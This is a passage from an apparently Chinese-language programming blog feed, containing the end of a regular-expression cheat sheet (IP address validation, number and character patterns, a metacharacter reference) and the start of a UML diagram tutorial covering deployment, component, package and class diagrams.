<h3 id="校验-IPv4-地址"><a href="#校验-IPv4-地址" class="headerlink" title="校验 IPv4 地址"></a>校验 IPv4 地址</h3><p><strong>描述：</strong>IP 地址是一个 32 位的二进制数，通常被分割为 4 个“8 位二进制数”（也就是 4 个字节）。IP 地址通常用“点分十进制”表示成（a.b.c.d）的形式，其中，a,b,c,d 都是 0~255 之间的十进制整数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^([01]?\d\d?|2[0-4]\d|25[0-5])\.([01]?\d\d?|2[0-4]\d|25[0-5])\.([01]?\d\d?|2[0-4]\d|25[0-5])\.([01]?\d\d?|2[0-4]\d|25[0-5])$</span><br></pre></td></tr></table></figure>

<p><strong>匹配：</strong>0.0.0.0 | 255.255.255.255 | 127.0.0.1</p>
<p><strong>不匹配：</strong>10.10.10 | 10.10.10.256</p>
<h3 id="校验-IPv6-地址"><a href="#校验-IPv6-地址" class="headerlink" title="校验 IPv6 地址"></a>校验 IPv6 地址</h3><p><strong>描述：</strong>IPv6 的 128 位地址通常写成 8 组，每组为四个十六进制数的形式。</p>
<p>IPv6 地址可以表示为以下形式：</p>
<ul>
<li>IPv6 地址</li>
<li>零压缩 IPv6 地址(<a href="https://tools.ietf.org/html/rfc5952#section-2.2" target="_blank" rel="noopener">section 2.2 of rfc5952</a>)</li>
<li>带有本地链接区域索引的 IPv6 地址 (<a href="https://tools.ietf.org/html/rfc4007#section-11" target="_blank" rel="noopener">section 11 of rfc4007</a>)</li>
<li>嵌入 IPv4 的 IPv6 地址(<a href="https://tools.ietf.org/html/rfc6052#section-2" target="_blank" rel="noopener">section 2 of rfc6052</a></li>
<li>映射 IPv4 的 IPv6 地址 (<a href="https://tools.ietf.org/html/rfc2765#section-2.1" target="_blank" rel="noopener">section 2.1 of rfc2765</a>)</li>
<li>翻译 IPv4 的 IPv6 地址 (<a href="https://tools.ietf.org/html/rfc2765#section-2.1" target="_blank" rel="noopener">section 2.1 of rfc2765</a>)</li>
</ul>
<p>显然，IPv6 地址的表示方式很复杂。你也可以参考</p>
<p><a href="http://baike.baidu.com/link?url=D3nmh0q_G_ZVmxXFG79mjjNfT4hs9fwjqUgygh-tvhq43KYqx88HV27WEXmoT4nA4iGzXwXMm5L-j50C2gSL5q" target="_blank" rel="noopener"><strong><em>百度百科-IPv6</em></strong></a></p>
<p><a href="http://stackoverflow.com/questions/53497/regular-expression-that-matches-valid-ipv6-addresses" target="_blank" rel="noopener"><strong><em>Stack overflow 上的 IPv6 正则表达高票答案</em></strong></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(([0-9a-fA-F]&#123;1,4&#125;:)&#123;7,7&#125;[0-9a-fA-F]&#123;1,4&#125;|([0-9a-fA-F]&#123;1,4&#125;:)&#123;1,7&#125;:|([0-9a-fA-F]&#123;1,4&#125;:)&#123;1,6&#125;:[0-9a-fA-F]&#123;1,4&#125;|([0-9a-fA-F]&#123;1,4&#125;:)&#123;1,5&#125;(:[0-9a-fA-F]&#123;1,4&#125;)&#123;1,2&#125;|([0-9a-fA-F]&#123;1,4&#125;:)&#123;1,4&#125;(:[0-9a-fA-F]&#123;1,4&#125;)&#123;1,3&#125;|([0-9a-fA-F]&#123;1,4&#125;:)&#123;1,3&#125;(:[0-9a-fA-F]&#123;1,4&#125;)&#123;1,4&#125;|([0-9a-fA-F]&#123;1,4&#125;:)&#123;1,2&#125;(:[0-9a-fA-F]&#123;1,4&#125;)&#123;1,5&#125;|[0-9a-fA-F]&#123;1,4&#125;:((:[0-9a-fA-F]&#123;1,4&#125;)&#123;1,6&#125;)|:((:[0-9a-fA-F]&#123;1,4&#125;)&#123;1,7&#125;|:)|fe80:(:[0-9a-fA-F]&#123;0,4&#125;)&#123;0,4&#125;%[0-9a-zA-Z]&#123;1,&#125;|::(ffff(:0&#123;1,4&#125;)&#123;0,1&#125;:)&#123;0,1&#125;((25[0-5]|(2[0-4]|1&#123;0,1&#125;[0-9])&#123;0,1&#125;[0-9])\.)&#123;3,3&#125;(25[0-5]|(2[0-4]|1&#123;0,1&#125;[0-9])&#123;0,1&#125;[0-9])|([0-9a-fA-F]&#123;1,4&#125;:)&#123;1,4&#125;:((25[0-5]|(2[0-4]|1&#123;0,1&#125;[0-9])&#123;0,1&#125;[0-9])\.)&#123;3,3&#125;(25[0-5]|(2[0-4]|1&#123;0,1&#125;[0-9])&#123;0,1&#125;[0-9]))</span><br></pre></td></tr></table></figure>

<p><strong>匹配：</strong>1:2:3:4:5:6:7:8 | 1:: | 1::8 | 1::6:7:8 | 1::5:6:7:8 | 1::4:5:6:7:8 | 1::3:4:5:6:7:8 | ::2:3:4:5:6:7:8 | 1:2:3:4:5:6:7:: | 1:2:3:4:5:6::8 | 1:2:3:4:5::8 | 1:2:3:4::8 | 1:2:3::8 | 1:2::8 | 1::8 | ::8 | fe80::7:8%1 | ::255.255.255.255 | 2001:db8:3:4::192.0.2.33 | 64:ff9b::192.0.2.33</p>
<p><strong>不匹配：</strong>1.2.3.4.5.6.7.8 | 1::2::3</p>
<h3 id="特定字符"><a href="#特定字符" class="headerlink" title="特定字符"></a>特定字符</h3><p>匹配长度为 3 的字符串：<code>^.{3}$</code>。</p>
<p>匹配由 26 个英文字母组成的字符串：<code>^[A-Za-z]+$</code>。</p>
<p>匹配由 26 个大写英文字母组成的字符串：<code>^[A-Z]+$</code>。</p>
<p>匹配由 26 个小写英文字母组成的字符串：<code>^[a-z]+$</code>。</p>
<p>匹配由数字和 26 个英文字母组成的字符串：<code>^[A-Za-z0-9]+$</code>。</p>
<p>匹配由数字、26 个英文字母或者下划线组成的字符串：<code>^\w+$</code>。</p>
<h3 id="特定数字"><a href="#特定数字" class="headerlink" title="特定数字"></a>特定数字</h3><p>匹配正整数：<code>^[1-9]\d*$</code></p>
<p>匹配负整数：<code>^-[1-9]\d*$</code></p>
<p>匹配整数：<code>^(-?[1-9]\d*)|0$</code></p>
<p>匹配正浮点数：<code>^[1-9]\d*\.\d+|0\.\d+$</code></p>
<p>匹配负浮点数：<code>^-([1-9]\d*\.\d*|0\.\d*[1-9]\d*)$</code></p>
<p>匹配浮点数：<code>^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$</code></p>
<h2 id="速查元字符字典"><a href="#速查元字符字典" class="headerlink" title="速查元字符字典"></a>速查元字符字典</h2><p>为了方便快查正则的元字符含义，在本节根据元字符的功能集中罗列正则的各种元字符。</p>
<h3 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h3><table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>*</code></td>
<td>匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td>
</tr>
<tr>
<td><code>+</code></td>
<td>匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td>
</tr>
<tr>
<td><code>?</code></td>
<td>匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 或 “does” 中的”do” 。? 等价于 {0,1}。</td>
</tr>
<tr>
<td><code>{n}</code></td>
<td>n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td>
</tr>
<tr>
<td><code>{n,}</code></td>
<td>n 是一个非负整数。至少匹配 n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*‘。</td>
</tr>
<tr>
<td><code>{n,m}</code></td>
<td>m 和 n 均为非负整数，其中 n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td>
</tr>
</tbody></table>
<h3 id="定位符"><a href="#定位符" class="headerlink" title="定位符"></a>定位符</h3><table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>^</code></td>
<td>匹配输入字符串开始的位置。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与 \n 或 \r 之后的位置匹配。</td>
</tr>
<tr>
<td><code>$</code></td>
<td>匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与 \n 或 \r 之前的位置匹配。</td>
</tr>
<tr>
<td><code>\b</code></td>
<td>匹配一个字边界，即字与空格间的位置。</td>
</tr>
<tr>
<td><code>\B</code></td>
<td>非字边界匹配。</td>
</tr>
</tbody></table>
<h3 id="非打印字符"><a href="#非打印字符" class="headerlink" title="非打印字符"></a>非打印字符</h3><table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>\cx</code></td>
<td>匹配由 x 指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。</td>
</tr>
<tr>
<td><code>\f</code></td>
<td>匹配一个换页符。等价于 \x0c 和 \cL。</td>
</tr>
<tr>
<td><code>\n</code></td>
<td>匹配一个换行符。等价于 \x0a 和 \cJ。</td>
</tr>
<tr>
<td><code>\r</code></td>
<td>匹配一个回车符。等价于 \x0d 和 \cM。</td>
</tr>
<tr>
<td><code>\s</code></td>
<td>匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。</td>
</tr>
<tr>
<td><code>\S</code></td>
<td>匹配任何非空白字符。等价于 [ \f\n\r\t\v]。</td>
</tr>
<tr>
<td><code>\t</code></td>
<td>匹配一个制表符。等价于 \x09 和 \cI。</td>
</tr>
<tr>
<td><code>\v</code></td>
<td>匹配一个垂直制表符。等价于 \x0b 和 \cK。</td>
</tr>
</tbody></table>
<h3 id="分组-1"><a href="#分组-1" class="headerlink" title="分组"></a>分组</h3><table>
<thead>
<tr>
<th>表达式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>(exp)</code></td>
<td>匹配的子表达式。()中的内容就是子表达式。</td>
</tr>
<tr>
<td><code>(?&lt;name&gt;exp)</code></td>
<td>命名的子表达式（反向引用）。</td>
</tr>
<tr>
<td><code>(?:exp)</code></td>
<td>非捕获组，表示当一个限定符应用到一个组，但组捕获的子字符串并非所需时，通常会使用非捕获组构造。</td>
</tr>
<tr>
<td><code>(?=exp)</code></td>
<td>匹配 exp 前面的位置。</td>
</tr>
<tr>
<td><code>(?&lt;=exp)</code></td>
<td>匹配 exp 后面的位置。</td>
</tr>
<tr>
<td><code>(?!exp)</code></td>
<td>匹配后面跟的不是 exp 的位置。</td>
</tr>
<tr>
<td><code>(?&lt;!exp)</code></td>
<td>匹配前面不是 exp 的位置。</td>
</tr>
</tbody></table>
<h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>\</code></td>
<td>将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。</td>
</tr>
<tr>
<td><code>|</code></td>
<td>指明两项之间的一个选择。</td>
</tr>
<tr>
<td><code>[]</code></td>
<td>匹配方括号范围内的任意一个字符。形式如：[xyz]、[^xyz]、[a-z]、[^a-z]、[x,y,z]</td>
</tr>
</tbody></table>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><strong>教程</strong><ul>
<li><a href="http://deerchao.net/tutorials/regex/regex.htm" target="_blank" rel="noopener">正则表达式 30 分钟入门教程</a></li>
<li><a href="https://msdn.microsoft.com/zh-cn/library/d9eze55x(v=vs.80).aspx" target="_blank" rel="noopener">msdn 正则表达式教程</a></li>
<li><a href="http://blog.csdn.net/lxcnn/article/details/4362500" target="_blank" rel="noopener">正则应用之——日期正则表达式</a></li>
<li><a href="https://github.com/ziishaned/learn-regex" target="_blank" rel="noopener">learn-regex</a></li>
<li><a href="http://www.regexlib.com/" target="_blank" rel="noopener">http://www.regexlib.com/</a></li>
</ul>
</li>
<li><strong>文章/常用正则表达式</strong><ul>
<li><a href="https://github.com/VincentSit/ChinaMobilePhoneNumberRegex/blob/master/README-CN.md" target="_blank" rel="noopener">ChinaMobilePhoneNumberRegex</a></li>
<li><a href="https://github.com/cdoco/common-regex" target="_blank" rel="noopener">https://github.com/cdoco/common-regex</a></li>
</ul>
</li>
<li><strong>正则测试</strong><ul>
<li><a href="https://regex101.com/" target="_blank" rel="noopener">https://regex101.com</a></li>
<li><a href="https://regexr.com/" target="_blank" rel="noopener">https://regexr.com</a></li>
<li><a href="https://www.debuggex.com/" target="_blank" rel="noopener">https://www.debuggex.com</a></li>
</ul>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Regex </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[UML 教程]]></title>
      <url>/2020/01/01/LearningUML/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://github.com/dunwu/blog/blob/master/source/_posts/tools/uml.md" target="_blank" rel="noopener">https://github.com/dunwu/blog/blob/master/source/_posts/tools/uml.md</a></p>
</blockquote>
<a id="more"></a>

<blockquote>
<p>关键词：<code>部署图</code>, <code>组件图</code>, <code>包图</code>, <code>类图</code>, <code>复合结构图</code>, <code>对象图</code>, <code>活动图</code>, <code>状态机图</code>, <code>用例图</code>, <code>通信图</code>, <code>交互概述图</code>, <code>时序图</code>, <code>时间图</code></p>
</blockquote>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="UML-图类型"><a href="#UML-图类型" class="headerlink" title="UML 图类型"></a>UML 图类型</h3><p>UML 图类型如下图所示：</p>
<figure class="image-box">
                <img src="1.png" alt title class>
                <p></p>
            </figure>

<h4 id="结构式建模图"><a href="#结构式建模图" class="headerlink" title="结构式建模图"></a><a href="UML结构建模图.md">结构式建模图</a></h4><blockquote>
<p>结构式建模图（Structure diagrams）强调的是系统式的建模。结构图定义了一个模型的静态架构。它们通常被用来对那些构成模型的‘要素’建模，诸如：类，对象，接口和物理组件。另外，它们也被用来对元素间关联和依赖关系进行建模。</p>
</blockquote>
<ul>
<li><a href="#类图">类图</a></li>
<li><a href="#对象图">对象图</a></li>
<li><a href="#包图">包图</a></li>
<li><a href="#组件图">组件图</a></li>
<li><a href="#部署图">部署图</a></li>
<li><a href="#复合结构图">复合结构图</a></li>
</ul>
<h4 id="行为式建模图"><a href="#行为式建模图" class="headerlink" title="行为式建模图"></a><a href="UML行为建模图.md">行为式建模图</a></h4><blockquote>
<p>行为式建模图（Behavior diagrams）强调系统模型中触发的事。行为图用来记录在一个模型内部，随时间的变化，模型执行的交互变化和瞬间的状态；并跟踪系统在真实环境下如何表现，以及观察系统对一个操作或事件的反应，以及它的结果。</p>
</blockquote>
<ul>
<li><a href="#活动图">活动图</a></li>
<li><a href="#状态图">状态图</a></li>
<li><a href="#用例图">用例图</a></li>
<li><a href="#通信图">通信图</a></li>
<li><a href="#交互概述图">交互概述图</a></li>
<li><a href="#时序图">时序图</a></li>
<li><a href="#时间图">时间图</a></li>
</ul>
<h3 id="UML-概念"><a href="#UML-概念" class="headerlink" title="UML 概念"></a>UML 概念</h3><p>UML 从来源中使用相当多的概念。我们将之定义于统一建模语言术语汇表。下面仅列代表性的概念。</p>
<ul>
<li>对于结构而言 - 执行者，属性，类，元件，接口，对象，包。</li>
<li>对于行为而言 - 活动（UML），事件（UML），消息（UML），方法（UML），操作（UML），状态（UML），用例（UML）。</li>
<li>对于关系而言 - 聚合，关联，组合，相依，广义化（or 继承）。</li>
<li>其他概念<ul>
<li>构造型—这规范符号应用到的模型</li>
<li>多重性—多重性标记法与资料库建模基数对应，例如：<code>1, 0..1, 1..*</code></li>
</ul>
</li>
</ul>
<h2 id="部署图"><a href="#部署图" class="headerlink" title="部署图"></a>部署图</h2><blockquote>
<p><strong>部署图（Deployment Diagram）用于对系统的物理结构建模</strong>。部署图将显示系统中的软件组件和硬件组件之间的关系以及处理工作的物理分布。</p>
</blockquote>
<figure class="image-box">
                <img src="2.png" alt title class>
                <p></p>
            </figure>

<h3 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h3><p>节点既可以是硬件元素，也可以是软件元素。它显示为一个立方体，如下图所示。</p>
<figure class="image-box">
                <img src="3.gif" alt title class>
                <p></p>
            </figure>

<h3 id="节点实例"><a href="#节点实例" class="headerlink" title="节点实例"></a>节点实例</h3><p>图可以显示节点实例，实例与节点的区分是：实例的名称带下划线，冒号放在它的基本节点类型之前。实例在冒号之前可以有名称，也可以没有名称。下图显示了一个具名的计算机实例。</p>
<figure class="image-box">
                <img src="4.gif" alt title class>
                <p></p>
            </figure>

<h3 id="节点构造型"><a href="#节点构造型" class="headerlink" title="节点构造型"></a>节点构造型</h3><p>为节点提供了许多标准的构造型，分别命名为 «cdrom»， «cd-rom»， «computer»， «disk array»， «pc»， «pc client»， «pc server»， «secure»， «server»， «storage»， «unix server»， «user pc»。 并在节点符号的右上角显示适当的图标。</p>
<figure class="image-box">
                <img src="5.gif" alt title class>
                <p></p>
            </figure>

<h3 id="工件"><a href="#工件" class="headerlink" title="工件"></a>工件</h3><p>工件是<a href="http://www.sparxsystems.cn/platforms/software_development.html" target="_blank" rel="noopener">软件开发</a>过程中的产品。包括过程模型（如：用例模型，设计模型等），源文件，执行文件，设计文档，测试报告，构造型，用户手册等等。</p>
<p>工件表示为带有工件名称的矩形，并显示«artifact»关键字和文档符号。</p>
<figure class="image-box">
                <img src="6.gif" alt title class>
                <p></p>
            </figure>

<h3 id="关联"><a href="#关联" class="headerlink" title="关联"></a>关联</h3><p>在部署图的上下文联系中，关联代表节点间的联系通道。下图显示了一个网络系统的部署图，描述了网络协议为构造型和关联终端的多重性，</p>
<figure class="image-box">
                <img src="7.gif" alt title class>
                <p></p>
            </figure>

<h3 id="作为容器的节点"><a href="#作为容器的节点" class="headerlink" title="作为容器的节点"></a>作为容器的节点</h3><p>节点可以包含其他元素，如组件和工件。下图显示了一个嵌入式系统某个部分的部署图。描写了一个被主板节点包含的可执行工件。</p>
<figure class="image-box">
                <img src="8.gif" alt title class>
                <p></p>
            </figure>

<h2 id="组件图"><a href="#组件图" class="headerlink" title="组件图"></a>组件图</h2><blockquote>
<p><strong>组件图（Component Diagram）描绘了组成一个软件系统的模块和嵌入控件</strong>。组件图比类图具有更高层次的抽象－通常运行时一个组件被一个或多个类（或对象）实现。它们象积木那样使得组件能最终构成系统的绝大部分。</p>
</blockquote>
<figure class="image-box">
                <img src="9.gif" alt title class>
                <p></p>
            </figure>

<p>上图演示了一些组件和它们的内部关系。装配连接器（Assembly connectors）“连接”由”Product”和”Customer”的提供接口到由 “Order”指定的需求接口。 一个依赖关系映射了客户相关的帐户信息到“Order”需要的 “Payment”需求接口。</p>
<p>实际上，组件图同包图很相似，它们都有明确的界限，把元素分组到逻辑结构中。他们之间的不同是：组件图提供了语义更丰富的分组机制，在组件图中，所有的模型元素都是私有的，而包图只显示公有的成员。</p>
<h3 id="表现组件"><a href="#表现组件" class="headerlink" title="表现组件"></a>表现组件</h3><p>组件可表示为带关键字 «component»的矩形类元；也可用右上角有组件图标的矩形表示。</p>
<figure class="image-box">
                <img src="10.gif" alt title class>
                <p></p>
            </figure>

<h3 id="装配连接器"><a href="#装配连接器" class="headerlink" title="装配连接器"></a>装配连接器</h3><p>装配连接器在组件 “Component1”的需求接口和另一个组件 “Component2”的提供接口之间建立桥梁; 这个桥梁使得一个组件能提供另一个组件所需要的服务。</p>
<figure class="image-box">
                <img src="11.gif" alt title class>
                <p></p>
            </figure>

<h3 id="带端口组件"><a href="#带端口组件" class="headerlink" title="带端口组件"></a>带端口组件</h3><p>使用端口的组件图允许在它的环境指定一个服务和行为，同时这个服务和行为也是组件需要的。当端口进行双向操作的时候，它可以指定输入和输出。下图详述了用于在线服务的带端口组件，它有两个提供接口 “order entry”和 “tracking”，也有 “payment” 需求接口。</p>
<figure class="image-box">
                <img src="12.gif" alt title class>
                <p></p>
            </figure>

<h2 id="包图"><a href="#包图" class="headerlink" title="包图"></a>包图</h2><blockquote>
<p><strong>包图（Package Diagram）用来表现包和它所包含元素的组织</strong>。当用来代表类元素时，包图提供了命名空间的可视化。包图最常用的用途是用来组织用例图和类图，尽管它不局限于这些 UML 元素。</p>
</blockquote>
<p>下面是一个包图的例子。</p>
<figure class="image-box">
                <img src="13.gif" alt title class>
                <p></p>
            </figure>

<p>包中的元素共享相同的命名空间，因此，一个指定命名空间的元素必须有唯一的名称。</p>
<p>包可以用来代表物理或逻辑关系。选择把类包括在指定的包里，有助于在同一个包里赋予这些类相同继承层次。通常认为把通过复合相关联的类，以及与它们相协作的类放在同一个包里。</p>
<figure class="image-box">
                <img src="14.gif" alt title class>
                <p></p>
            </figure>

<p>在 UML2.5 中，包用文件夹来表示，包中的元素共享同一个命名空间，并且必须是可识别的，因此要有唯一的名称或类型。包必须显示包名，在附属方框部分有选择的显示包内的元素。</p>
<ul>
<li><strong>包的合并</strong> - 包之间的合并连接符«merge»定义了源包元素与目标包同名元素之间的泛化关系。源包元素的定义被扩展来包含目标包元素定义。当源包元素与目标包内没有同名元素时，目标包元素的定义不受影响。</li>
<li><strong>包的导入</strong> - 导入连接符 «import»表明目标包的元素，在该例中是一个类 ，在源包中被引用要用非限定修饰名。源包的命名空间获得目标类的接口，目标包的命名空间则不受影响。</li>
<li><strong>嵌套连接符</strong> - 源包和目标包间的嵌套连接符说明目标包完全包含源包。</li>
</ul>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><blockquote>
<p><strong>类图（Class Diagram）展示了面向对象系统的构造模块</strong>。描绘了模型或部分模型的静态视图，显示它包含的属性和行为，而不是详细描述操作的功能或完善方法。类图最常用来表达多个类和接口之间的关系。泛化（Generalizations），聚合（aggregations）和关联（associations）分别是类之间继承，复合或应用，及连接的表现。</p>
</blockquote>
<p>下面的图显示了类之间的聚合关系。弱聚合（浅色箭头）表现在类 “Account” 使用 “AddressBook”，但是不必要包含它的一个实例。强聚合（图中的黑色箭头）表示了目标类包含源类，例如，”Contact” 和 “ContactGroup”值被包含在 “AddressBook”中。</p>
<figure class="image-box">
                <img src="15.png" alt title class>
                <p></p>
            </figure>

<h3 id="类（Classes）"><a href="#类（Classes）" class="headerlink" title="类（Classes）"></a>类（Classes）</h3><p>类是定义对象所具有的属性和行为的元素。行为用类能理解的合适消息和适合每条消息的操作来描述。 类中也可能定义约束，标记值，构造型。</p>
<h3 id="类的标柱（Class-Notation）"><a href="#类的标柱（Class-Notation）" class="headerlink" title="类的标柱（Class Notation）"></a>类的标柱（Class Notation）</h3><p>类用矩形表示。除类的名称外，还可以选择性地显示属性和操作。 分栏分别用来显示类的名称，属性和操作。</p>
<p>在下面图中，类的类名显示在最上面的分栏，它下面的分栏显示详细属性，如：”center” 属性显示初始化的值。最后面的分栏显示操作，如： setWidth，setLength 和 setPosition 以及他们的参数。 属性和操作名前的标注表示了该属性或操作的可见性: 如果使用 “+”号，这个属性或操作是公共的 ; “-“ 号则代表这个属性或操作是私有的。 “#”号是这个属性或操作被定义为保护的，” ~“ 号代表包的可见性。</p>
<figure class="image-box">
                <img src="16.gif" alt title class>
                <p></p>
            </figure>

<h3 id="接口（Interfaces）"><a href="#接口（Interfaces）" class="headerlink" title="接口（Interfaces）"></a>接口（Interfaces）</h3><p>接口是实施者同意满足的行为规范，是一种约定。实现一个接口，类必需支持其要求的行为，使系统按照同样的方式，即公共的接口，处理不相关的元素。</p>
<figure class="image-box">
                <img src="17.gif" alt title class>
                <p></p>
            </figure>

<p>接口有相似于类的外形风格，含有指定的操作，如下图所示。如果没有明确的详细操作，也可以画成一个圆环。当画成圆环的时候，到这个环形标柱的实现连接没有目标箭头。</p>
<figure class="image-box">
                <img src="18.gif" alt title class>
                <p></p>
            </figure>

<h3 id="表（Tables）"><a href="#表（Tables）" class="headerlink" title="表（Tables）"></a>表（Tables）</h3><p>表尽管不是基本 UML 的一部分，仍然是“图型”能完成的实例用。在右上角画一个表的小图标来表示。表属性用“图型” «column»表示。 绝大多数表单有一个主键，是由一个或几个字段组成的一个唯一的字码组合加主键操作来访问表格，主键操作“图型”为«PK»。 一些表有一个或多个外键，使用一个或多个字段加一个外键操作，映射到相关表的主键上去，外键操作“图型”为«FK»。</p>
<figure class="image-box">
                <img src="19.gif" alt title class>
                <p></p>
            </figure>

<h3 id="关联（Associations）"><a href="#关联（Associations）" class="headerlink" title="关联（Associations）"></a>关联（Associations）</h3><p>关联表明两个模型元素之间有关系，通常用在一个类中被实现为一个实例变量。连接符可以包含两端的命名的角色，基数性，方向和约束。关联是元素之间普通的关系。如果多于两个元素，也可以使用菱形的关联关系。当从类图生成代码时，关联末端的对象将变成目标类中实例变量。见下图示例 “playsFor” 将变成”Player”类中的实例变量。</p>
<figure class="image-box">
                <img src="20.gif" alt title class>
                <p></p>
            </figure>

<h3 id="泛化（Generalizations）"><a href="#泛化（Generalizations）" class="headerlink" title="泛化（Generalizations）"></a>泛化（Generalizations）</h3><p>泛化被用来说明继承关系。连接从特定类元到一般类元。泛化的含义是源类继承了目标类的特性。下图的图显示了一个父类泛化一个子类， 类“Circle”的一个实例将会有属性 “ x_position”，“ y_position” ， “radius” 和 方法 “display()”。 注意：类 “Shape” 是抽象的，类名显示为斜体。</p>
<figure class="image-box">
                <img src="21.gif" alt title class>
                <p></p>
            </figure>

<p>下图显示了与上图相同信息的视图。</p>
<figure class="image-box">
                <img src="22.gif" alt title class>
                <p></p>
            </figure>

<h3 id="聚合（Aggregations）"><a href="#聚合（Aggregations）" class="headerlink" title="聚合（Aggregations）"></a>聚合（Aggregations）</h3><p>聚合通常被用来描述由更小的组件所构成的元素。聚合关系表示为白色菱形箭头指向目标类或父类。</p>
<p>聚合的更强形式 -组合聚合（强聚合） - 显示为黑色菱形箭头，用来组合每次最大化的包含组件。如果一个组合聚合的父类被删除，通常与他相关的所有部分都会被删除，但是，如果一个部件从组合中去掉，将不用删除整个组合。组合是可迁，非对称的关系和递归的。</p>
<p>下面的图示：显示了弱聚合和强聚合的不同。“ address book” 由许多 “contacts” 和 “contact groups”组成。 “contact group” 是一个“contacts”的虚分组; “contact”可以被包含在不止一个 “ contact group”。 如果你删除一个“ address book”，所有的 “contacts” 和 “contact groups” 也将会被删除；如果你删除“ contact group”， 没有 “contacts”会被删除。</p>
<figure class="image-box">
                <img src="23.gif" alt title class>
                <p></p>
            </figure>

<h3 id="关联类（Association-Classes）"><a href="#关联类（Association-Classes）" class="headerlink" title="关联类（Association Classes）"></a>关联类（Association Classes）</h3><p>关联类是一个允许关联连接有属性和操作的构造。下面的示例：显示了远不止简单连接两个类的连接，如给“employee”分配项目。“ employee”在项目中所起的作用是一个复杂的实体，既有自身的也有不属于“employee” 或 “project” 类的细节。 例如，“ employee”可以同时为几个项目工作，有不同的职务头衔和对应的安全权限。</p>
<figure class="image-box">
                <img src="24.gif" alt title class>
                <p></p>
            </figure>

<h3 id="依赖（Dependencies）"><a href="#依赖（Dependencies）" class="headerlink" title="依赖（Dependencies）"></a>依赖（Dependencies）</h3><p>依赖被用来描述模型元素间广泛的依赖关系。通常在设计过程早期显示两个元素之间存在某种关系，因为是初期而不能确定具体是什么关系，在设计过程末期，该继承关系会被归入已有构造型 (构造型 可以是实例化 «instantiate»，跟踪 «trace»，导入 «import»， 和其它的关系)，或被替换成一个更明确类型的连接符。</p>
<h3 id="跟踪（Traces）"><a href="#跟踪（Traces）" class="headerlink" title="跟踪（Traces）"></a>跟踪（Traces）</h3><p>跟踪关系是一种特殊化的依赖关系。连接模型元素或跨模型但是具有相同概念的模型元素集。跟踪被经常用来追踪需求和模型的变化。由于变化是双向的，这种依赖关系的顺序通常被忽略。这种关系的属性可以被指定为单向映射，但跟踪是双向的，非正式的和很少可计算的。</p>
<h3 id="实现（Realizations）"><a href="#实现（Realizations）" class="headerlink" title="实现（Realizations）"></a>实现（Realizations）</h3><p>是源对象执行或实现目标，实现被用来表达模型的可跟踪性和完整性－业务模型或需求被一个或多个用例实现，用例则被类实现，类被组件实现，等等。这种实现贯穿于系统设计的映射需求和类等，直至抽象建模水平级。从而确保整个系统的一张宏图，它也反映系统的所有微小组成，以及约束和定义它的细节。实现关系用带虚线的实箭头表示。</p>
<figure class="image-box">
                <img src="25.gif" alt title class>
                <p></p>
            </figure>

<h3 id="嵌套（Nestings）"><a href="#嵌套（Nestings）" class="headerlink" title="嵌套（Nestings）"></a>嵌套（Nestings）</h3><p>嵌套连接符用来表示源元素嵌套在目标元素中。下图显示“ inner class”的定义，尽管在 EA 中，更多地按照着他们在项目层次视图中的位置来显示这种关系。</p>
<figure class="image-box">
                <img src="26.gif" alt title class>
                <p></p>
            </figure>

<h2 id="复合结构图"><a href="#复合结构图" class="headerlink" title="复合结构图"></a>复合结构图</h2><blockquote>
<p><strong>复合结构图显示类的内部结构，包括它与系统其他部分的交互点。也显示各部分的配置与关系，这些部分一起执行类元的行为。</strong></p>
</blockquote>
<p>类元素已经在类图部分被详细地阐述，这部分用来说明类表现复合元素的方式，如：暴露接口，包含端口和部件。</p>
<figure class="image-box">
                <img src="27.gif" alt title class>
                <p></p>
            </figure>

